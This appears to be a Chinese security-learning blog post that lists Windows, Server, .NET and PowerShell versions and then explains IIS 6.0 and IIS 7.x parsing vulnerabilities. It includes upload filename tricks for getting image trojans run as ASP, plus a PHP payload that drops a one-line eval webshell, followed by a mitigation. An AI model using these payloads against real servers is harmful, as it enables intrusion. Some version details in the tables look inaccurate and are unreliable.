**目录**

[MS-Dos](#t0 "MS-Dos")

[Win 9X](#t1 "Win 9X")

[Win NT](#t2 "Win NT")

[Windows Server](#t3 "Windows Server")

[.NET FrameWork](#t4 ".NET FrameWork")

[PowerShell](#t5 "PowerShell")

[IIS6.0漏洞](#t6 "IIS6.0漏洞")

    [解析漏洞](#t7 "    解析漏洞")

[IIS7.0/7.5漏洞](#t8 "IIS7.0/7.5漏洞")

    [畸形解析漏洞](#t9 "    畸形解析漏洞")

* * *

MS-Dos
------

| 版本号 | 发布时间 |
| --- | --- |
| Windows1.0 | 1985.11 |
| Windows2.0 | 1987.12 |
| Windows2.1 | 1988 |
| Windows3.0 | 1990.5 |
| Windows3.1 | 1992 |
| Windows3.2 | 1994 |

  
Win 9X
---------

| 版本号 | 发布时间 |
| --- | --- |
| Windows95 | 1995.8(拥有开始按钮和菜单栏) |
| Windows98 | 1998.6(真正意义上的图形化界面系统) |
| Windows98SE | 1999 |
| WindowsME | 2000.9 |

  
Win NT
---------

| 版本号 | 发布时间 |
| --- | --- |
| WindowsNT3.1 | 1993 |
| WindowsNT4.0 | 1996.4 |
| Windows 2000 (NT5.0) | 2000 |
| Windows XP (NT5.1) | 2001.10    2009.4停止更新 |
| Window Vista (NT6.0) | 2005.11 |
| Windows 7 (NT6.1) | 2009 |
| Windows 8 (NT6.3) | 2012.10 |
| Windows 8.1 | 2013.10 |
| Windows 10 (NT10.0) | 2015.7 |

Windows Server
--------------

| 版本号 | 发布时间 | IIS版本 |
| --- | --- | --- |
| Windows Server 2003 | 2003.3         2015.7停止更新 | IIS6.0 |
| Windows Server 2008 | 2008.2 | IIS7.0/IIS7.5 |
| Windows Server 2012 | 2012.9 | IIS8.0 |
| Windows Server 2016 | 2016.10 | IIS10 |

.NET FrameWork
--------------

.NET FrameWork是微软的新一代技术平台，为敏捷商务构建互联互通的应用系统，这些系统是基于标准的，联通的，适应变化的，稳定的和高性能的。从技术的角度，一个.NET应用是一个运行于.NET Framework之上的应用程序。（更精确的说，一个.NET应用是一个使用.NET Framework类库来编写，并运行于公共语言运行时Common Language Runtime之上的应用程序。）如果一个应用程序跟.NET Framework无关，它就不能叫做.NET程序。比如，仅仅使用了XML并不就是.NET应用，仅仅使用SOAP SDK调用一个Web Service也不是.NET应用。.NET是基于Windows运行的操作平台，应用于互联网的分布式。

.NET平台类似Java平台，是微软于2000年推出的Windows操作系统的应用软件开发框架，发展至今形成巨大的技术栈，涉及多语言（支持C#、F#、VB.NET)多领域（Windows桌面软件、Web应用、移动开发等）软件开发，随着2014年，微软宣布.NET开源，支持Linux等平台，和Java平台一样实现了跨平台。

| 版本 | 发行日期 | Visual Studio | Windows默认安装 |
| --- | --- | --- | --- |
| .Net Framework1.0 | 2002-02-13 | Visual  
Studio 2002 | Windows XP  |
| .Net Framework1.1 | 2003-04-24 | Visual Studio 2003 | Windows Server 2003 |
| .Net Framework2.0 | 2005-11-07 | Visual Studio 2005 | ​ |
| .Net Framework3.0 | 2006-11-06 | ​ | Windows Vista,Windows Server 2008 |
| .Net Framework3.5 | 2007-11-19 | Visual Studio 2008 | Windows 7,Windows Server 2008 R2 |
| .Net Framework4.0 | 2010-04-12 | Visual Studio 2010 | Windows 7,Windows Server 2008 R2 |
| .Net Framework4.5 | 2011-09-20 | Visual Studio 2012 | Windows 8/8.1 |
| .Net Framework4.6 | 2015-07-21 | Visual Studio 2015 | Windows 10 |
| .Net Framework4.7 | 2017-10-18 | Visual Studio 2017 | Windows 10 |

PowerShell
----------

Windows [Powershell](https://so.csdn.net/so/search?q=Powershell&spm=1001.2101.3001.7020)是一种命令行外壳程序和脚本环境，它从Windows7开始，就已经内置在了Windows中，PowerShell使命令行用户和脚本编写者可以利用 .NET FrameWork的强大功能。一旦攻击者可以在一台计算机上运行代码，他们就会下载PowerShell脚本文件(.ps1)到磁盘中执行，甚至无须写到磁盘中执行，它可以直接在内存中执行，也可以把PowerShell看成是命令行提示符cmd.exe的扩充。

PowerShell需要.NET环境的支持，同时支持.NET对象，其可读性、易用性，可以位居当前所有Shell之首。PowerShell的这些特点正则吸引攻击者，使他逐渐成为一个非常流行的攻击工具。

一个PowerShell脚本其实就是一系列PowerShell命令的集合，PowerShell脚本的后缀名为 .PS1

PowerShell的执行策略：

为了防止恶意脚本的执行，PowerShell有一个执行策略，默认情况下，这个执行策略被设置为受限

在PowerShell脚本无法执行时，可以使用下面的cmdlet命令确定当前的执行策略

*   Get-ExectionPolicy
*   Restricted ：脚本不能执行(默认设置)
*   RemoteSigned：本地创建的脚本可以执行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)
*   AllSigned：仅当脚本由受信任的发布者签名时才能运行
*   Unrestricted：允许所有的脚本运行

PowerShell具有以下优点：

*   Windows7以上系统默认安装
*   PowerShell脚本可以运行在内存中，不需要写入磁盘
*   可以从另一个系统中下载PowerShell脚本并执行
*   很多安全软件并不能检测到PowerShell的活动
*   cmd.exe通常会被阻止运行，但是PowerShell不会
*   可以用来管理活动目录

<table border="1" cellpadding="1" cellspacing="1" style="width:500px;"><tbody><tr><td>操作系统</td><td>PowerShell版本</td></tr><tr><td>Win7 / Win Server 2008</td><td>2.0</td></tr><tr><td>Win8 / Win Server 2012</td><td>3.0</td></tr><tr><td>Win8.1 / Win Server 2012R2</td><td>4.0</td></tr><tr><td>Win10 / Win Server 2016</td><td>5.0</td></tr></tbody></table>

IIS6.0漏洞
--------

###     解析漏洞

1、在网站目录中如果存在名为\*.asp、\*.asa、\*.cer、\*.cdx的目录，那该目录内的任何文件都会被[IIS](https://so.csdn.net/so/search?q=IIS&spm=1001.2101.3001.7020)解析为asp文件并执行。

2、在上传图片木马的时候，将文件名改为件文件都\*.asp;.jpg、\*.asa;.jpg、\*.cer;.jpg ，该文件被IIS解析为asp文件并执行。

注：IIS6.0对域后缀是asp、asa、cer的文件都当成是asp文件执行，对于cdx后缀的文件动作是下载

IIS7.0/7.5漏洞
------------

###     畸形解析漏洞

在IIS7.0、IIS7.5中，在默认Fast-CGI开启状况下，新建一个1.txt文件，内容为<?php fputs(fopen('shell.php','w'),'<?php @eval($\_POST\['xie'\])?>')?>，将文件保存成1.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/1.jpg，此时神奇的畸形解析开始发挥作用啦，我们会神奇的发现/upload目录下创建了一个一句话木马文件shell.php。

临时解决办法：关闭cgi.fix\_pathinfo为0

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)